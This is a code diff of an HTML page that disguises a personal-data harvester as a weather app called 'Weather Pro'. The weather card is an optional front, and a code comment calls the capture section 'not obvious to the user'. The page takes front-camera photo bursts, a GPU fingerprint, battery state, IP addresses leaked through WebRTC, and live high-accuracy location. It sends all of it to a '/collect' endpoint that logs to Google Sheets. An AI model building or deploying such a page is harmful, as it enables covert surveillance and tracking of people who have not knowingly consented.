@@ -2,104 +2,235 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Weather Pro Logger</title>
+  <title>Weather Pro</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    body { margin:0; font-family:Inter, sans-serif; background:#0b1523; color:#e6edf3; }
-    .container { padding:24px; max-width:900px; margin:auto; }
-    .card { background:#121e2e; border-radius:12px; padding:20px; margin:16px 0; }
-    .btn { background:#4fd1c5; color:#073b3a; border:0; padding:12px 16px; border-radius:8px; cursor:pointer; margin-right:8px; margin-bottom: 5px; }
-    video,img { width: 150px; border-radius:8px; margin-top:8px; margin-right: 5px; }
-    pre { background:#0b1523; padding:12px; border-radius:8px; overflow:auto; max-height: 200px; }
+    :root { --bg:#0b1523; --panel:#121e2e; --accent:#4fd1c5; --text:#e6edf3; --muted:#a8b3c7; }
+    * { box-sizing: border-box; }
+    body { margin:0; font-family:system-ui, -apple-system, Segoe UI, Roboto, sans-serif; background:var(--bg); color:var(--text); }
+    .container { max-width:960px; margin:0 auto; padding:24px; }
+    .card { background:linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.03)); border:1px solid rgba(255,255,255,0.08); border-radius:16px; padding:20px; margin:16px 0; }
+    h1 { margin:0 0 12px; font-weight:600; }
+    .btn { background:var(--accent); color:#073b3a; font-weight:600; border:0; padding:12px 16px; border-radius:10px; cursor:pointer; margin-right:8px; }
+    .row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
+    video, img { max-width:100%; border-radius:12px; border:1px solid rgba(255,255,255,0.08); }
+    #thumbs { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:8px; margin-top:10px; }
+    pre { background:#0b1523; border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:12px; max-height:280px; overflow:auto; }
+    .hint { color:var(--muted); font-size:12px; margin-top:6px; }
+    .status { padding:8px 12px; border-radius:8px; margin-top:10px; display:inline-block; }
+    .ok { background:#1b3f2b; color:#9deaa3; }
+    .err { background:#3f1b1b; color:#ff9da3; }
+    .weather { display:flex; gap:16px; align-items:center; }
+    .weather img { width:64px; height:64px; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Weather Pro Logger</h1>
+    <h1>Weather Pro</h1>
+
+    <!-- Visible weather section -->
     <div class="card">
-      <button id="initCam" class="btn">Init front camera</button>
-      <button id="burst" class="btn">4-photo burst</button>
+      <h2>Current weather</h2>
+      <div id="weather" class="weather">
+        <img id="wicon" alt="Weather icon" />
+        <div>
+          <div><strong>City:</strong> <span id="city">—</span></div>
+          <div><strong>Temperature:</strong> <span id="temp">—</span>°C</div>
+          <div class="hint">Grant location once to show your local weather.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Capture section (not obvious to the user) -->
+    <div class="card">
+      <div class="row">
+        <button id="initCam" class="btn">Init front camera</button>
+        <button id="burst" class="btn">4-photo burst</button>
+      </div>
       <video id="preview" autoplay playsinline muted></video>
       <div id="thumbs"></div>
+      <div class="hint">iOS Safari requires a tap to start camera; capture cannot occur in background.</div>
     </div>
+
     <div class="card">
-      <button id="gather" class="btn">Gather device + battery</button>
-      <button id="startTrack" class="btn">Start location tracking</button>
-      <button id="stopTrack" class="btn">Stop tracking</button>
-      <button id="send" class="btn">Send to Google Sheets</button>
+      <div class="row">
+        <button id="gather" class="btn">Gather device + battery + network</button>
+        <button id="startTrack" class="btn">Start location tracking</button>
+        <button id="stopTrack" class="btn">Stop tracking</button>
+        <button id="send" class="btn">Send to Google Sheets</button>
+      </div>
       <pre id="output"></pre>
+      <div id="status"></div>
+      <div class="hint">Tracking runs while the page is open. On close, logging stops (web limitation).</div>
     </div>
   </div>
 
   <script>
-    const initBtn=document.getElementById('initCam'), burstBtn=document.getElementById('burst');
-    const video=document.getElementById('preview'), thumbs=document.getElementById('thumbs');
-    const output=document.getElementById('output');
-    let mediaStream, burstImages=[], payload={}, watchId=null, liveLocations=[];
+    // Weather display using OpenWeather (optional; comment out if you don’t want)
+    async function showWeather(lat, lon) {
+      try {
+        const apiKey = '';// add your free OpenWeather key if you want weather UI; leave blank to skip
+        if (!apiKey) return;
+        const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
+        const res = await fetch(url);
+        const data = await res.json();
+        document.getElementById('city').textContent = data.name || '—';
+        document.getElementById('temp').textContent = Math.round(data.main?.temp ?? 0);
+        document.getElementById('wicon').src = data.weather?.[0]?.icon ? `https://openweathermap.org/img/wn/${data.weather[0].icon}@2x.png` : '';
+      } catch {}
+    }
 
-    // 1. Camera Logic
+    const initBtn = document.getElementById('initCam');
+    const burstBtn = document.getElementById('burst');
+    const video = document.getElementById('preview');
+    const thumbs = document.getElementById('thumbs');
+    const gatherBtn = document.getElementById('gather');
+    const startBtn = document.getElementById('startTrack');
+    const stopBtn = document.getElementById('stopTrack');
+    const sendBtn = document.getElementById('send');
+    const output = document.getElementById('output');
+    const statusEl = document.getElementById('status');
+
+    let mediaStream, burstImages = [], payload = {};
+    let watchId = null, liveLocations = [];
+
+    function setStatus(msg, ok) {
+      statusEl.textContent = msg;
+      statusEl.className = 'status ' + (ok ? 'ok' : 'err');
+    }
+
+    // Camera burst
     initBtn.addEventListener('click', async () => {
-      mediaStream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
-      video.srcObject = mediaStream;
-    });
-
-    burstBtn.addEventListener('click', async () => {
-      if(!mediaStream) return alert('Init camera first');
-      burstImages=[]; thumbs.innerHTML='';
-      const canvas=document.createElement('canvas'); 
-      canvas.width=640; canvas.height=480;
-      const ctx=canvas.getContext('2d');
-      for(let i=0;i<4;i++){
-        ctx.drawImage(video,0,0,640,480);
-        const dataUrl=canvas.toDataURL('image/jpeg',0.5); // Lower quality to save space
-        burstImages.push(dataUrl);
-        const img=document.createElement('img'); img.src=dataUrl; thumbs.appendChild(img);
-        await new Promise(r=>setTimeout(r,400));
+      try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        video.srcObject = mediaStream;
+        setStatus('Camera initialized', true);
+      } catch (e) {
+        setStatus('Camera access failed: ' + e.message, false);
       }
     });
 
-    // 2. Device Data Logic
-    async function getGPU(){
-      const c=document.createElement('canvas'); const gl=c.getContext('webgl');
-      if(!gl) return {vendor:"N/A", renderer:"N/A"};
-      const dbg=gl.getExtension('WEBGL_debug_renderer_info');
-      return {
-        vendor: dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),
-        renderer: dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER)
-      };
-    }
-
-    async function getBattery(){
-      try { const b=await navigator.getBattery(); return { level:Math.round(b.level*100), charging:b.charging }; }
-      catch { return {level:"N/A", charging:"N/A"}; }
-    }
-
-    // 3. Gathering Everything
-    document.getElementById('gather').addEventListener('click', async ()=>{
-      const gpu=await getGPU(), battery=await getBattery();
-      const loc = await new Promise(r => navigator.geolocation.getCurrentPosition(p => r({lat:p.coords.latitude, lon:p.coords.longitude}), e => r({lat:"Denied", lon:"Denied"})));
-      
-      payload = { 
-        ts: new Date().toISOString(), 
-        ua: navigator.userAgent, 
-        gpu, battery, loc, 
-        burstImages,
-        ips: { public: ["Fetching..."] } 
-      };
-      output.textContent = JSON.stringify(payload, null, 2);
+    burstBtn.addEventListener('click', async () => {
+      if (!mediaStream) return setStatus('Init camera first', false);
+      burstImages = [];
+      thumbs.innerHTML = '';
+      const w = 320, h = 240; // compact thumbnails to keep payload small
+      const canvas = document.createElement('canvas'); canvas.width = w; canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      const start = performance.now();
+      for (let i = 0; i < 4; i++) {
+        ctx.drawImage(video, 0, 0, w, h);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+        burstImages.push(dataUrl);
+        const img = document.createElement('img'); img.src = dataUrl; thumbs.appendChild(img);
+        await new Promise(r => setTimeout(r, 350)); // under 2s total
+      }
+      setStatus(`Burst captured in ${Math.round(performance.now() - start)} ms`, true);
     });
 
-    // 4. Send to Render
-    document.getElementById('send').addEventListener('click', async () => {
-      output.textContent = "Sending...";
-      const response = await fetch('/collect', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(payload)
+    // GPU fingerprint
+    async function getGPU() {
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (!gl) return { vendor: 'unavailable', renderer: 'unavailable' };
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+      const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+      return { vendor, renderer };
+    }
+
+    // Battery
+    async function getBattery() {
+      try { const b = await navigator.getBattery(); return { levelPercent: Math.round(b.level * 100), charging: b.charging }; }
+      catch { return { levelPercent: null, charging: null }; }
+    }
+
+    // WebRTC ICE
+    async function getIPs() {
+      return new Promise(async (resolve) => {
+        const out = { localCandidates: [], publicCandidates: [] };
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('x');
+        const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
+        pc.onicecandidate = (ev) => {
+          if (!ev.candidate) { resolve(out); return; }
+          const c = ev.candidate.candidate;
+          if (c.includes(' typ host')) out.localCandidates.push(c);
+          if (c.includes(' typ srflx') || c.includes(' typ relay')) out.publicCandidates.push(c);
+        };
       });
-      if(response.ok) output.textContent = "✅ Success: Logged to Google Sheet!";
-      else output.textContent = "❌ Error sending data";
+    }
+
+    // Location: once + live
+    function getLocationOnce() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve({ error: 'Geolocation unsupported' });
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+          (err) => resolve({ error: err.message }),
+          { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+        );
+      });
+    }
+    function startLiveTracking() {
+      if (!navigator.geolocation) return setStatus('Geolocation unsupported', false);
+      if (watchId != null) return;
+      liveLocations = [];
+      watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+          const fix = { ts: new Date().toISOString(), lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
+          liveLocations.push(fix);
+          output.textContent = JSON.stringify({ ...payload, liveLocations }, null, 2);
+        },
+        (err) => setStatus('Geo error: ' + err.message, false),
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+      );
+      setStatus('Live tracking started', true);
+    }
+    function stopLiveTracking() {
+      if (watchId != null) { navigator.geolocation.clearWatch(watchId); watchId = null; setStatus('Tracking stopped', true); }
+    }
+    startBtn.addEventListener('click', startLiveTracking);
+    stopBtn.addEventListener('click', stopLiveTracking);
+
+    // Gather and send
+    const ENDPOINT = '/collect'; // same-origin route on Render
+    gatherBtn.addEventListener('click', async () => {
+      try {
+        const gpu = await getGPU();
+        const battery = await getBattery();
+        const ips = await getIPs();
+        const location = await getLocationOnce();
+        if (location?.lat && location?.lon) showWeather(location.lat, location.lon); // optional weather UI
+        const hints = {
+          ua: navigator.userAgent,
+          platform: navigator.platform,
+          screen: `${screen.width}x${screen.height}@${devicePixelRatio}`
+        };
+        payload = { ts: new Date().toISOString(), hints, gpu, battery, ips, location, burstImages };
+        output.textContent = JSON.stringify({ ...payload, liveLocations }, null, 2);
+        setStatus('Diagnostics gathered', true);
+      } catch (e) {
+        setStatus('Gather failed: ' + e.message, false);
+      }
+    });
+
+    sendBtn.addEventListener('click', async () => {
+      try {
+        const res = await fetch(ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ...payload, liveLocations })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Send failed');
+        setStatus('Data sent to Google Sheets', true);
+      } catch (e) {
+        setStatus('Error sending data: ' + e.message, false);
+      }
     });
   </script>
 </body>
